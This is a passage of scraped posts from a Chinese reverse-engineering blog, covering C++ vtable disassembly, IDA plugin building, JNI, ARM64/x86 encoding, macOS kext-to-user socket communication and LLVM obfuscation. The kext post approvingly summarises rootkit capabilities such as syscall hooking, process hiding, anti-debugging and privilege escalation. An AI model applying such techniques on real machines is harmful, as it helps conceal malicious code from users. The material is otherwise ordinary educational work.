Shape::setHeight((Shape *)v3, 7); v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;); v5 = Rectangle::getArea((Rectangle *)v3); v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5); std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6); return 0; } 这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。 实验二#include &lt;iostream&gt; using namespace std; // 基类 class Shape { public: // 提供接口框架的纯虚函数 virtual int getArea() = 0; void setWidth(int w) { width = w; } void setHeight(int h) { height = h; } protected: int width; int height; }; // 派生类 class Rectangle: public Shape { public: int getArea() { return (width * height); } }; class Triangle: public Shape { public: int getArea() { return (width * height)/2; } }; int main(void) { Rectangle Rect; Triangle Tri; Rect.setWidth(5); Rect.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl; Tri.setWidth(5); Tri.setHeight(7); // 输出对象的面积 cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl; return 0; } 上面的代码编译完成后，在ida中反汇编如下 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // ST20_8 unsigned int v4; // eax __int64 v5; // ST10_8 unsigned int v6; // eax char v8; // [rsp+28h] [rbp-48h] char v9; // [rsp+38h] [rbp-38h] int v10; // [rsp+4Ch] [rbp-24h] __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h] __int64 v12; // [rsp+58h] [rbp-18h] __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h] __int64 v14; // [rsp+68h] [rbp-8h] v10 = 0; Rectangle::Rectangle((Rectangle *)&amp;v9); Triangle::Triangle((Triangle *)&amp;v8); Shape::setWidth((Shape *)&amp;v9, 5); Shape::setHeight((Shape *)&amp;v9, 7); v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;); v4 = Rectangle::getArea((Rectangle *)&amp;v9); v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4); v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12); Shape::setWidth((Shape *)&amp;v8, 5); Shape::setHeight((Shape *)&amp;v8, 7); v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;); v6 = Triangle::getArea((Triangle *)&amp;v8); v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6); v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;; std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14); return 0; } 这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下 __int64 *__fastcall Rectangle::Rectangle(Rectangle *this) { __int64 *result; // rax Shape::Shape(this); result = &amp;`vtable for&#39;Rectangle + 2; *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2; return result; } 这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下 __int64 *__fastcall Shape::Shape(Shape *this) { __int64 *result; // rax result = &amp;`vtable for&#39;Shape + 2; *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2; return result; } 其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。 这里的虚函数表地址，本质就是_DATA段的一个数据结构。 Rect的内存布局为 (lldb) x/20b $rbp-0x38 0x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x00 0x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00 这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height 去ida中查看该地址 __data:0000000100002110 ; `vtable for&#39;Rectangle __data:0000000100002110 __ZTV9Rectangle dq 0 ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o __data:0000000100002110 ; offset to this __data:0000000100002118 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle __data:0000000100002120 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void) 就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。 一点理解C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"}]},{"title":"IDA7.0 Mac 插件编译指南v1","date":"2017-11-30T06:25:09.000Z","path":"2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/","text":"先说两句前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。 搭建xcode环境在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。 我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry 然后再选择为Dynamic动态库，并导入C++标准库 接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示 这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。 Build setting这里我们将设置头文件和库的搜索路径等等。 首先设置目标架构为x86_64 然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径 经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库 这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。 最后我们还需要设置编译参数 其中__EA64__在编译64位插件时才有。 这时候build一下，如果一切顺利，应该就不会报错了。 最后说两句IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为findcrypt264.dylib表示为64位插件，则对应的32位插件名为findcry.dylib 下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。 上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了Ctrl-Alt-z的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。 完附上该插件，完。 findcrypt264.dylib_for_ida7_made_by_x1a0 参考链接 http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/ https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile ​","tags":[{"name":"ida","slug":"ida","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"}]},{"title":"Android JNI踩坑笔记","date":"2017-11-28T09:00:20.000Z","path":"2017/11/28/Android_JNI_掉坑笔记 /JNI/","text":"最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。 坑1–jni方法签名分号问题这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名 jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;); 切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。 jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;); 这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。 坑2–原生方法包含默认2个参数这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数 static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...} 第一个保留参数为JNIEnv虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。 由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。 这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。 坑3—jni调用父类方法的正确姿势这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找Exception这个类的getStackTrace 方法时提示方法找不到错误，调了会才发现这个方法是在其父类Throwable中，所以正确的写法为： jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;); jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;); jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;); 那么怎么调用呢？用CallNonvirtual&lt;XXX&gt;Method去调用父类中的方法，一个调用例子： jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id); 这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。 坑4—其他小坑写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如jstring与char*的转换，LOGE()函数中参数为char*的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下jni.h头文件就能找到。 还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的build.gradle文件中在defaultConfig{}加入下面的脚本： sourceSets.main{ jni.srcDirs &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39; jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39; } 无非是手动指定了jni相关的文件路径。 关于下面两类写法： jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;); jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;); 原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。 完说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。 继续踩坑去了…","tags":[{"name":"android","slug":"android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"}]},{"title":"ARM64基础知识整理","date":"2017-10-21T10:07:00.000Z","path":"2017/10/21/ARM64基础知识整理/ARM64基础知识整理/","text":"ARM64基础知识整理Register参数寄存器 (X0-X7)参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。 其他特殊寄存器 X29(FP) 栈帧寄存器 类比x64中rbp X30(LR) 链接寄存器，保存函数返回地址，x64该地址保存在栈中 SP 栈顶寄存器，类比x64中 PC 指向下一条指令 寄存器 描述 CPSR 状态寄存器 Instructions mov mov x0, x1; copies x1 into x0 mov x1, 0x4141; loads the value 0x4141 in x1 str/ldr str x0, [x29]; store x0 at the address in x29 ldr x0, [x29]; load the value from the address in x29 into x0 stp/ldp stp x29, x30, [sp]; store x29 at sp and x30 at sp+8 b/br br x0; jump to the address stored in x0 ret Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there. Indexing modes Immediate offset : [base, #offset] - Index an offset directly and don’t mess with anything else ldr x0, [sp, 0x10]; load x0 from sp+0x10 Pre-indexed : [base, #offset]! - Almost the same as above, except that base+offset is written back into base. ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10 Post-indexed : [base], #offset - Use the base directly and then write base+offset back into the base ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10 函数调用demo分析__text:000000010004F0D4 SUB SP, SP, #0x70 __text:000000010004F0D8 STP X24, X23, [SP,#0x60+var_30] __text:000000010004F0DC STP X22, X21, [SP,#0x60+var_20] __text:000000010004F0E0 STP X20, X19, [SP,#0x60+var_10] __text:000000010004F0E4 STP X29, X30, [SP,#0x60+var_s0] __text:000000010004F0E8 ADD X29, SP, #0x60 __text:000000010004F0EC MOV X19, X0 __text:000000010004F0F0 ADRP X8, #___stack_chk_guard_ptr@PAGE __text:000000010004F0F4 LDR X8, [X8,#___stack_chk_guard_ptr@PAGEOFF] __text:000000010004F0F8 LDR X8, [X8] __text:000000010004F0FC STR X8, [SP,#0x60+var_38] __text:000000010004F100 ADRP X8, #classRef_Fabric@PAGE __text:000000010004F104 LDR X20, [X8,#classRef_Fabric@PAGEOFF] __text:000000010004F108 NOP __text:000000010004F10C LDR X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void * __text:000000010004F110 ADRP X8, #selRef_class@PAGE __text:000000010004F114 LDR X1, [X8,#selRef_class@PAGEOFF] ; char * __text:000000010004F118 BL _objc_msgSend ... __text:000000010004F2F4 LDP X29, X30, [SP,#0x60+var_s0] __text:000000010004F2F8 LDP X20, X19, [SP,#0x60+var_10] __text:000000010004F2FC LDP X22, X21, [SP,#0x60+var_20] __text:000000010004F300 LDP X24, X23, [SP,#0x60+var_30] __text:000000010004F304 ADD SP, SP, #0x70 __text:000000010004F308 RET 地址 栈值 描述 sp=sp-0x70 局部变量空间 sp-0x60 局部变量空间 sp-0x50 局部变量空间 sp-0x40 X24/X23 保存寄存器信息 sp-0x30 X22/X21 保存寄存器信息 sp-0x20 X20/X19 保存寄存器信息 X29 –&gt; sp-0x10 X29/X30 保存前栈基址和返回地址 sp=sp 调用前的栈顶地址 Arm32 参考 https://www.jianshu.com/p/2f4a5f74ac7a https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start https://blog.perfect.blue/ROPing-on-Aarch64 https://azeria-labs.com/assembly-basics-cheatsheet/","tags":[{"name":"ARM64","slug":"ARM64","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"}]},{"title":"X86指令编码笔记","date":"2017-10-11T03:46:13.000Z","path":"2017/10/11/x86指令编码笔记/X86指令编码笔记/","text":"由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。 x86指令编码格式很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。 x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了Intel 64和IA-32架构下的指令格式，当然，这两种架构所采用的都是x86指令编码： 从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。 指令prefixprefix简单的说来就是调整内存操作数属性，增强指令的作用等。 lock 和 repeat 其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。 operand-size override （66H — 改变默认操作数大小） 这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。 address-size override （67H — 改变默认操作数地址大小） 这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。 segment override，branch hints 和 bound 其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。 ​ | 2E | 3E | 26 | 64 | 65 | 36 || ———– | ———– | ———– | ———– | ———– | ———– || CS register | DS register | ES register | FS register | GS register | SS register | REX prefix—开启 64 位计算的基石REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个） 7 6 5 4 3 2 1 0 0 1 0 0 W R X B W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size R: 用来扩展 ModRM.reg 域 X: 用来扩展 SIB.index 域 B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg 寄存器编码表 下面来分析这条指令： mov eax,ebx 正常编码为：89 d8 下面看看在不同的REX.W和66H prefix下的不同： 48 89 d8——————&gt; mov rax,rbx 66 48 89 d8—————&gt; mov rax,rbx 66 40 89 d8—————&gt; mov ax, bx ​ 第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，REX.W = 1 第 2 条指令编码加上了 66H prefix 同时还有 REX prefix（REX.W = 1），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？实际上，很简单！48H 位于 66H 后面，66H 将被覆盖！也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 operand size 是 64 位的。 第 3 条指令编码也同样使用了 66H prefix 和 REX prefix，但是 REX.W = 0 意味着不改变原来的 operand size！在这种情况下，REX prefix 不会与 66H prefix 产生冲突，最终的作用于 66H prefix，因此 operand size 是 16 位的。 opcode整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。 一个opcode可以由一个byte组成，我们称之为1-byte opcode，当然，与之对应的，就有2-bytes opcode和3-bytes opcode。其中，后两者一般会有一个被称为escape opcode的byte进行引导，该byte的数值是0FH。所以，一般情况下，2-bytes opcode就是0FH后面再加一个byte，而3-bytes opcode就是0FH后面再加两个bytes。 ModR/MModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。 由一个byte组成，其格式如下： 7 6 5 4 3 2 1 0 mod reg R/M 1、mod：寻址模式。 2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。 mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式： mod = 00，定义 [register] 间接寻址，无displacement值。 mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。 mod = 10，定义 [register + disp32]，有32位displacement偏移值。 2、reg：寄存器ID值 3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。 reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。 3、r/m：意即register / memory。 ​ 提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。 注意: (1) 如果像这条指令：mov eax, [eax+ecx2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+indexscale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。 原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。 (2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。 Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。 SIBSIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。 7-6 5-4-3 2-1-0 scale index base index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。 Displacement 和 Immediate某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。 综合起来，看下面的例子： 49 8b 7d 00 49=0100 1001对应REX prefix,默认64为size模式 8b= mov opcode 7d=01 111 101—&gt;ModR/M mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13 00=Displacement = 0 所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13] ​ 参考及索引http://ref.x86asm.net/coder32.html —-&gt; 查阅opcode http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png —&gt;quick look Intel x86 Assembler Instruction Set Opcode Table http://www.mouseos.com/x64/index.html https://bbs.pediy.com/thread-78121.htm X86指令编码的那些事儿 http://subler.github.io/note/compiler/x86_instruction_encode.html onlineDisassembler","tags":[{"name":"x86","slug":"x86","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"}]},{"title":"一种用户层与kext内核扩展交互方式","date":"2017-08-10T07:59:00.000Z","path":"2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/","text":"最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。简单说下rootKit原理：利用kext驻留在内核，完成实际的各种功能：sys_ptrace过滤 PT_DENY_ATTACH反调试hook系统调用防止sys_kil（很强大有木有）隐藏自身进程，文件监控，网络监控，提权等等可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。 0x01 一个例子进入kext开发在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。 打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下 #include &lt;mach/mach_types.h&gt; #include &lt;libkern/libkern.h&gt; kern_return_t TestExtension_stop(kmod_info_t *ki, void *d); kern_return_t TestExtension_start(kmod_info_t * ki, void *d) { printf(&quot;hello kext!\\n&quot;); return KERN_SUCCESS; } kern_return_t TestExtension_stop(kmod_info_t *ki, void *d) { printf(&quot;bye kext!\\n&quot;); return KERN_SUCCESS; } 其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。 简单编译一下，然后找到编译后的kext文件，输入命令改变权限 sudo chown -R root:wheel TestExtension.kext 再输入 sudo kextload TestExtension.kext 加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令 sudo kextunload TestExtension.kext 来卸载该内核扩展，你同样会看到bye kext这句话。 0x02 用户层与内和扩展间的交互下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用PF_SYSTEM协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。 kext 示例代码#include &lt;sys/systm.h&gt; #include &lt;mach/mach_types.h&gt; #include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt; //#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt; char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext struct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data) { int err ; struct kern_ctl_reg ctlreg ; bzero(&amp;ctlreg, sizeof(ctlreg)) ; //控制信息 ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */ ctlreg.ctl_unit = 0 ; strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name)); //回调函数 ctlreg.ctl_connect_func = connect ; ctlreg.ctl_disconnect_func = disconnect ; ctlreg.ctl_send_func = send ; ctlreg.ctl_getopt_func = getopt ; ctlreg.ctl_setopt_func = setopt ; //注册内核控制 err = ctl_register(&amp;ctlreg, &amp;_ctlref) ; if (err) return KERN_FAILURE ; return KERN_SUCCESS ; } 下面解释下其中的kern_ctl_ref数据结构 struct kern_ctl_reg { /* 控制信息 */ char ctl_name[MAX_KCTL_NAME]; u_int32_t ctl_id; u_int32_t ctl_unit; /* 控制设置 */ u_int32_t ctl_flags; u_int32_t ctl_sendsize; u_int32_t ctl_recvsize; /* 回调函数 */ ctl_connect_func ctl_connect;//建立连接时调用 ctl_disconnect_func ctl_disconnect;//断开连接时调用 ctl_send_func ctl_send;//处理从client到kernel的数据发送 ctl_setopt_func ctl_setopt; //当client调用setsockopt时调用 ctl_getopt_func ctl_getopt;//当client调用getsockopt时调用 }; client 示例代码#include &lt;socket.h&gt; #include &lt;string.h&gt; #include &lt;sys/kern_control.h&gt; #include &lt;sys/ioctl.h&gt; char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext static int g_socket = -1; u_int32_t getctlidbybame(int sock, char *name) ; //建立连接 int socket_ctl(char *name) { int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ; if (g_sock == 0) return 0 ; u_int32_t id = getctlidbyname(g_sock, name) ; sockaddr_ctl addr ; addr.sc_len = sizeof(addr) ; addr.sc_family = AF_SYSTEM ; addr.sc_sysaddr = AF_SYS_CONTROL ; addr.sc_id = id ; addr.sc_unit = 0 ; /* allocate dynamically */ int err ; err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ; if (err) return 0 ; return sock ; } u_int32_t getctlidbybame(int sock, char *name) { struct ctl_info info ; memset(&amp;info, 0, sizeof(info)) ; strncpy(info.ctl_name, name, strlen(name)) ; int err = ioctl(sock, CTLIOCGINGO, &amp;info) ; if (err) return 0 ; /* should do something stronger here! */ return info.ctl_id ; } int main(int argc, const char *argv[]) { socket_ctl(name); } //发送数据 void execute_cmd(int cmd, char *args) { char data[32] = { 0 }; size_t data_len = 0; int retv; if(args != NULL) { memcpy(data, args, strlen(args)); } data_len = strlen(data) + 1; retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len); if(retv != 0) { printf(&quot;[ERROR] Kernel command execution failed:\\n&quot;); printf(&quot;\\t%s (%d)\\n&quot;, strerror(errno), errno); return; } } //接收数据 void get_data() { char *data = malloc(32); socklen_t data_len = 32; int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len); if(retv != 0) { printf(&quot;[ERROR] getsockopt()\\n&quot;); return; } size_t r = recv(g_socket, data, data_len, 0); if(r == 0) { printf(&quot;[ERROR] recv()\\n&quot;); return; } } 代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。 0x03 总结在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续… 0x04 参考 http://www.tanhao.me/pieces/1515.html/ https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html https://github.com/enzolovesbacon/inficere","tags":[{"name":"kext","slug":"kext","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"}]},{"title":"初-LLVM的代码混淆","date":"2017-06-25T07:09:13.000Z","path":"2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/","text":"0x00 目录 断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新 LLVM简介 一个基于LLVM简单的代码混淆例子 参考链接 0x01 LLVM简介LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。LLVM的主要架构如下： 前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。 Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。 后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。 LLVM框架：这里与传统的编译器不同，LLVM采用了一种统一的中间表示： 安装与使用首先下载LLVM $ cd where-you-want-llvm-to-live $ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm 我们选择clang作为LLVM前端，然后下载clang $ cd where-you-want-llvm-to-live $ cd llvm/tools $ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang 下载编译运行库 $ cd where-you-want-llvm-to-live $ cd llvm/projects $ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt 最后编译LLVM源码 $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/ $ make 编译时间可能有点长，编译完成之后进行安装 $sudo make install 